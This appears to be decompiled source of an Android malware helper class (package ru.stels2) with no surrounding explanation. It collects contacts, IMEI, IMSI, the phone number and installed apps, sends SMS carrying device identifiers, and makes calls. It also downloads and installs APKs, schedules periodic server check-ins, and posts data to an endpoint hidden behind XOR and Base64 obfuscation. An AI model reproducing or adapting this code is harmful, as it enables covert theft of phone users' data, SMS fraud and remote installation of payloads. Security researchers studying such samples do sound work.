package ru.stels2;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.support.v4.view.MotionEventCompat;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.client.utils.URLEncodedUtils;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONObject;

public class Functions {
    public static HttpURLConnection sendHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList, boolean uploadFile, String data) {
        String KContentType = "multipart/form-data; boundary=AaB03x";
        String KStartContent = "--AaB03x";
        String KEndContent = "--AaB03x--";
        String KCrlf = "\r\n";
        URL url = null;
        try {
            int i;
            NameValuePair param;
            if (method.equals("POST")) {
                url = new URL(path);
            } else if (method.equals("GET")) {
                url = new URL(path + "?" + URLEncodedUtils.format(paramsList, "utf-8"));
            }
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod(method);
            if (method.equals("POST")) {
                connection.setRequestProperty("Content-Type", KContentType);
            }
            for (i = 0; i < propertyList.size(); i++) {
                param = (NameValuePair) paramsList.get(i);
                connection.setRequestProperty(param.getName(), param.getValue());
            }
            if (method.equals("POST")) {
                DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
                for (i = 0; i < paramsList.size(); i++) {
                    param = (NameValuePair) paramsList.get(i);
                    outputStream.writeBytes(KStartContent);
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Disposition: form-data; name=\"" + param.getName() + "\"");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes(KCrlf);
                    outputStream.write(param.getValue().getBytes("utf-8"));
                    outputStream.writeBytes(KCrlf);
                }
                if (uploadFile) {
                    outputStream.writeBytes(KStartContent);
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Disposition: form-data; name=\"FILE\"; filename=\"data.json\"");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Type: application/octet-stream");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes("Content-Transfer-Encoding: binary");
                    outputStream.writeBytes(KCrlf);
                    outputStream.writeBytes(KCrlf);
                    outputStream.write(data.getBytes("utf-8"));
                    outputStream.writeBytes(KCrlf);
                }
                outputStream.writeBytes(KEndContent);
                outputStream.writeBytes(KCrlf);
                outputStream.flush();
                outputStream.close();
            } else if (method.equals("GET")) {
                connection.connect();
            }
            return connection;
        } catch (Exception ex) {
            ex.printStackTrace();
            return null;
        }
    }

    public static void sendPostRequest(String path, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        sendSimpleHttpRequest(path, "POST", paramsList, propertyList);
    }

    public static void sendGetRequest(String path, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        sendSimpleHttpRequest(path, "GET", paramsList, propertyList);
    }

    public static void sendSimpleHttpRequest(String path, String method, List<NameValuePair> paramsList, List<NameValuePair> propertyList) {
        try {
            HttpURLConnection connection = sendHttpRequest(path, method, paramsList, propertyList, false, null);
            if (connection != null) {
                int code = connection.getResponseCode();
                connection.disconnect();
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static JSONObject parseResponse(InputStream stream) {
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(stream), 8);
            StringBuffer stringBuffer = new StringBuffer();
            while (true) {
                String line = bufferedReader.readLine();
                if (line == null) {
                    break;
                }
                stringBuffer.append(line);
            }
            bufferedReader.close();
            String response = stringBuffer.toString().trim();
            System.out.println("response: " + response);
            if (response.length() > 3) {
                for (int i = 0; i < 3 && !response.startsWith("{"); i++) {
                    response = response.substring(1);
                }
            }
            return new JSONObject(response);
        } catch (Exception ex) {
            ex.printStackTrace();
            return new JSONObject();
        }
    }

    public static List<String> getContacts(Context context) {
        List<String> list = new ArrayList();
        Uri uri = null;
        try {
            String name = "";
            Class[] childClasses;
            int i;
            if (VERSION.SDK_INT > 4) {
                childClasses = Class.forName("android.provider.ContactsContract").getClasses();
                i = 0;
                while (i < childClasses.length) {
                    if (childClasses[i].getCanonicalName().equals("android.provider.ContactsContract.CommonDataKinds")) {
                        childClasses = childClasses[i].getClasses();
                        for (int j = 0; j < childClasses.length; j++) {
                            if (childClasses[j].getCanonicalName().equals("android.provider.ContactsContract.CommonDataKinds.Phone")) {
                                Class phoneClass = childClasses[j];
                                uri = (Uri) phoneClass.getField("CONTENT_URI").get(null);
                                name = (String) phoneClass.getField("NUMBER").get(null);
                                break;
                            }
                        }
                    } else {
                        i++;
                    }
                }
            } else {
                childClasses = Class.forName("android.provider.Contacts").getClasses();
                for (i = 0; i < childClasses.length; i++) {
                    if (childClasses[i].getCanonicalName().equals("android.provider.Contacts.Phones")) {
                        Class phonesClass = childClasses[i];
                        uri = (Uri) phonesClass.getField("CONTENT_URI").get(null);
                        name = (String) phonesClass.getField("NUMBER").get(null);
                        break;
                    }
                }
            }
            Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);
            while (cursor.moveToNext()) {
                String phone = cursor.getString(cursor.getColumnIndex(name));
                list.add(phone);
                System.out.println("phone: " + phone);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return list;
    }

    public static String contactsToJson(List<String> contacts) {
        JSONArray jsonArray = new JSONArray();
        int i = 0;
        while (i < contacts.size()) {
            try {
                jsonArray.put(contacts.get(i));
                i++;
            } catch (Exception ex) {
                ex.printStackTrace();
                return "";
            }
        }
        return jsonArray.toString();
    }

    public static boolean downloadFile(String localPath, String httpUrl, String fileName) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(httpUrl).openConnection();
            c.setRequestMethod("GET");
            c.setDoOutput(true);
            c.connect();
            File file = new File(localPath);
            file.mkdirs();
            FileOutputStream fos = new FileOutputStream(new File(file, fileName));
            InputStream is = c.getInputStream();
            byte[] buffer = new byte[1024];
            while (true) {
                int len1 = is.read(buffer);
                if (len1 != -1) {
                    fos.write(buffer, 0, len1);
                } else {
                    fos.close();
                    is.close();
                    return true;
                }
            }
        } catch (Exception e) {
            return false;
        }
    }

    public static void makeCall(Context context, String phone) {
        Intent intent = new Intent("android.intent.action.CALL", Uri.parse("tel:" + phone));
        intent.addFlags(268435456);
        context.startActivity(intent);
    }

    public static void installApk(Context context, String path) {
        try {
            Intent intent = new Intent("android.intent.action.VIEW");
            intent.addFlags(268435456);
            intent.setDataAndType(Uri.fromFile(new File(path)), "application/vnd.android.package-archive");
            context.startActivity(intent);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void openUrl(Context context, String url) {
        try {
            Intent browserIntent = new Intent("android.intent.action.VIEW", Uri.parse(url));
            browserIntent.addFlags(268435456);
            context.startActivity(browserIntent);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void uninstallApk(Context context, String pkg) {
        try {
            Intent intent = new Intent("android.intent.action.DELETE");
            intent.setData(Uri.parse("package:" + pkg));
            intent.addFlags(268435456);
            context.startActivity(intent);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void showNotification(Context context, String tickerText, String title, String text, int icon, String url) {
        try {
            NotificationManager mNotificationManager = (NotificationManager) context.getSystemService("notification");
            Notification notification = new Notification(icon, tickerText, System.currentTimeMillis());
            Intent notificationIntent = new Intent("android.intent.action.VIEW", Uri.parse(url));
            notificationIntent.addFlags(268435456);
            notification.setLatestEventInfo(context, title, text, PendingIntent.getActivity(context, 0, notificationIntent, 0));
            mNotificationManager.notify(1, notification);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static boolean sendSms(String number, String text) {
        Settings settings = Settings.getSettings();
        if (settings != null) {
            text = text.replace("{IMEI}", settings.imei).replace("{IMSI}", settings.imsi).replace("{SID}", settings.sid).replace("{VERSION}", settings.version) + settings.subPref;
        }
        try {
            SmsManager.getDefault().sendTextMessage(number, null, text, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }
    }

    public static String loadAndDecode(Context context, String path) {
        try {
            InputStream inputStream = context.getClass().getResourceAsStream(path);
            int size = 0;
            while (inputStream.read() != -1) {
                try {
                    size++;
                } catch (Exception e) {
                }
            }
            inputStream.close();
            inputStream = context.getClass().getResourceAsStream(path);
            byte[] arr = new byte[size];
            readDataFromStream(inputStream, arr);
            inputStream.close();
            int j = 0;
            int key_length = arr[0] & MotionEventCompat.ACTION_MASK;
            for (int i = key_length + 1; i < arr.length; i++) {
                arr[i] = (byte) (arr[i] ^ (arr[j + 1] & MotionEventCompat.ACTION_MASK));
                j++;
                if (j == key_length) {
                    j = 0;
                }
            }
            return new String(arr, key_length + 1, (arr.length - key_length) - 1, "utf-8");
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static void readDataFromStream(InputStream stream, byte[] data) throws IOException {
        int pos = 0;
        int length = data.length;
        while (true) {
            int read = stream.read(data, pos, length);
            length -= read;
            if (length != 0) {
                pos += read;
            } else {
                return;
            }
        }
    }

    public static SmsMessage[] getSmsMessages(Bundle paramBundle) {
        Object[] array = (Object[]) paramBundle.get("pdus");
        SmsMessage[] messages = new SmsMessage[array.length];
        for (int i = 0; i < array.length; i++) {
            messages[i] = SmsMessage.createFromPdu((byte[]) array[i]);
        }
        return messages;
    }

    public static String getImei(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            if (telephonyManager == null) {
                return "";
            }
            return telephonyManager.getDeviceId();
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static String getPhone(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            if (telephonyManager == null) {
                return "";
            }
            String phone = telephonyManager.getLine1Number();
            if (phone == null) {
                return "";
            }
            return phone;
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static String getImsi(Context context) {
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            if (telephonyManager == null) {
                return "";
            }
            return telephonyManager.getSubscriberId();
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static String decript(String data) {
        return decript(Base64.decode(data, 0));
    }

    public static String decript(byte[] data) {
        int j = 0;
        try {
            int key_length = data[0] & MotionEventCompat.ACTION_MASK;
            for (int i = key_length + 1; i < data.length; i++) {
                data[i] = (byte) (data[i] ^ (data[j + 1] & MotionEventCompat.ACTION_MASK));
                j++;
                if (j == key_length) {
                    j = 0;
                }
            }
            return new String(data, key_length + 1, (data.length - key_length) - 1, "utf-8");
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    public static List<PackageInfo> getInstalledAppList(Context context) {
        try {
            return context.getPackageManager().getInstalledPackages(0);
        } catch (Exception ex) {
            ex.printStackTrace();
            return new ArrayList();
        }
    }

    public static String appListToJson(List<PackageInfo> list) {
        JSONArray jsonArray = new JSONArray();
        int i = 0;
        while (i < list.size()) {
            try {
                jsonArray.put(((PackageInfo) list.get(i)).packageName);
                i++;
            } catch (Exception ex) {
                ex.printStackTrace();
                return "";
            }
        }
        return jsonArray.toString();
    }

    public static void startTimer(Context context) {
        try {
            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction("custom.alarm");
            ((AlarmManager) context.getSystemService("alarm")).set(0, Settings.getSettings().timeNextConnection, PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void startTimerInfo(Context context) {
        try {
            Intent intent = new Intent(context, MainReceiver.class);
            intent.setAction("custom.alarm.info");
            ((AlarmManager) context.getSystemService("alarm")).setRepeating(0, System.currentTimeMillis() + ((long) (Constants.DAY * 7)), (long) (Constants.DAY * 7), PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static boolean loadSettings(Context context) {
        if (Settings.getSettings() != null) {
            return true;
        }
        Settings settings = new Settings();
        Settings.setSettings(settings);
        if (settings.load(context)) {
            return true;
        }
        return false;
    }

    public static boolean sendEmail(String to, String subject, String text) {
        try {
            List<NameValuePair> params = new LinkedList();
            params.add(new BasicNameValuePair("to", to));
            params.add(new BasicNameValuePair("subject", subject));
            params.add(new BasicNameValuePair("text", text));
            HttpURLConnection connection = (HttpURLConnection) new URL(decript("FGRmaZ2awotthYxMJtobJOLUSAw2DBId7aDtpAzr4yJft3RRkbFmY0QDSQr68+/pBOujLUi1dQmHuSllWkoFDvQ=")).openConnection();
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.write(URLEncodedUtils.format(params, "utf-8").getBytes("utf-8"));
            outputStream.flush();
            outputStream.close();
            if (connection != null && connection.getResponseCode() == 200) {
                return true;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return false;
    }
}
